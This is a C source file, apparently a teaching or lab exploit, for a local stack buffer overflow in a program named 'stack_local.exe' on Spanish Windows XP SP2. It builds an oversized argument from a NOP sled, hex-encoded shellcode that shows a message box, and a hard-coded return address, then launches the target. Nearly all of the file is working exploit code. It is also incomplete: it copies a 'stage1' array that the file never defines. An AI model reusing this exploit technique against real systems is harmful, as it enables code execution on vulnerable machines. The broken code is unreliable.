
#include<stdio.h>
#include<string.h>
#include<windows.h>
#define RET_ADDRESS 0x7c933da3 // On WinXP XP2 spanish
// First stage shellcode - decrease ecx by 512 and JMP ecx

// MessageBox
unsigned char shellcode[] =
"\x55\x89\xE5\x31\xC0\xB0\x16\x29\xC4\x31\xC0\x50\x68\x2E\x64\x6C"
"\x6C\x68\x65\x72\x33\x32\x66\x68\x75\x73\x54\xB8\x77\x1D\x80\x7C"
"\xFF\xD0\xC9\x55\x89\xE5\x31\xC9\xB1\x20\x29\xCC\x31\xC9\x51\x66"
"\x51\x6A\x41\x66\x68\x6F\x78\x68\x61\x67\x65\x42\x68\x4D\x65\x73"
"\x73\x89\xE3\x51\x53\x50\xBB\xA0\xAD\x80\x7C\xFF\xD3\xC9\x89\xC6"
"\x31\xC0\x50\x68\x74\x69\x6F\x6E\x68\x6F\x72\x6D\x61\x68\x20\x49"
"\x6E\x66\x68\x42\x69\x6C\x6C\x89\xE3\x50\x68\x74\x65\x6D\x2E\x68"
"\x20\x73\x79\x73\x68\x66\x69\x6C\x65\x68\x6E\x6C\x79\x20\x68\x61"
"\x64\x20\x4F\x66\x68\x52\x65\x89\xE1\x66\x50\x50\x40\x50\x53\x51"
"\x48\x50\x89\xF0\xFF\xD0\x50\xBB\xDA\xCD\x81\x7C\xFF\xD3";

int main(int argc,char *argv[])
{
	char *bufExe[3];
	char buf[540];
	bufExe[0] = "stack_local.exe";
	bufExe[2] = NULL;
	buf[531]=0;

	memset(buf,0x90,520);
	memcpy(&buf[20],shellcode,sizeof(shellcode)-1);
	memcpy(&buf[520],stage1,sizeof(stage1));
	*(unsigned long *)&buf[516] = RET_ADDRESS; //Return Address at offset 516
	bufExe[1] = buf;
	//Execute the vulnerable application
	execve(bufExe[0],bufExe,NULL);
	return 0x0;
}

